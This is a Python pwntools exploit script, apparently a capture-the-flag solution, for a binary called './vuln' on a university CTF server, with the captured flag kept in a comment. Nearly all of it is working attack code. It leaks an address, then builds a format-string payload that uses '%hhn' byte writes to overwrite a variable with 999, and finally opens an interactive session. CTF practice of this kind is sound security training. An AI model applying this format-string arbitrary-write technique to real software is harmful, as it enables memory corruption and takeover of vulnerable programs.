#!/usr/bin/python3

from pwn import *

PROG_NAME = "./vuln"
REMOTE_IP = "pwn.ctf.unswsecurity.com"
REMOTE_PORT = 5006

# SKYLIGHT{stiLL_b3tt3r_formatt1ng_than_MS_Word}

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
else:
    p = process(PROG_NAME)
    elf = p.elf

if args.ATTACH:
	gdb.attach(p, '''break main''')

def get_n(new, prev, size):
    while new <= prev:
        new += (1 << size)
    return new-prev

def gen_addrs(base_addr):
    addrs = b''
    for i in range(4):
        addrs += p32(base_addr + i)
    return addrs

def gen_format_writes(to_write, setup_len, stack_offset):
    payload = b''
    n_val = [setup_len]
    for i in range(4):
        n_val += [get_n(to_write[i], sum(n_val[:i+1]), 8)]
        payload += '%{}c'.format(n_val[i+1]).encode()
        payload += '%{}$hhn'.format(stack_offset + i).encode()
    return payload

p.recvlines(3)
i_addr = int(p.recvline().rstrip().split()[-1], 16)

payload = gen_addrs(i_addr)
setup_len = len(payload)
payload += gen_format_writes(p32(999), setup_len, 7)

p.sendline(payload)

p.interactive()